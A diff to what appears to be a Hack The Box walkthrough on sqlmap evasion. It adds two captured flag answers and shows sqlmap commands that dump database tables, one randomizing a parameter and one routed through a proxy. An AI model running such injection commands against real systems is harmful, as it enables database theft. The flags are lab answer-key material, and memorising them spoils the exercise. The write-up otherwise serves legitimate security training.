@@ -57,7 +57,7 @@ The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where paylo
         +----+-----------------------------------+
         <SNIP>
         ```
-2. What's the contents of table flag9? (Case #9) **Answer:**
+2. What's the contents of table flag9? (Case #9) **Answer: HTB{700_much_r4nd0mn355_f0r_my_74573}**
    - Run sqlmap with randomize parameter value:
         ```shellsession
         $ sqlmap -u "http://154.57.164.69:32239/case9.php?id=1*&uid=607775628" --batch --level 5 --risk 3 --threads 10 --randomize=uid -T flag9 --dump
@@ -72,7 +72,7 @@ The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where paylo
         +----+---------------------------------------+
         <SNIP>
         ```
-3. What's the contents of table flag10? (Case #10) **Answer:**
+3. What's the contents of table flag10? (Case #10) **Answer: HTB{y37_4n07h3r_r4nd0m1z3}**
    - Specify `--proxy` option to see how the server process sqlmap's requests → notice that because of sqlmap's `User-Agent` the server is only responding with empty 200 OK responses:
         ```shellsession
         $ sqlmap -u "http://154.57.164.69:32239/case10.php" --data "id=1*" --batch --level 5 --risk 3 --threads 10 -T flag10 --dump --proxy="http://127.0.0.1:8080"
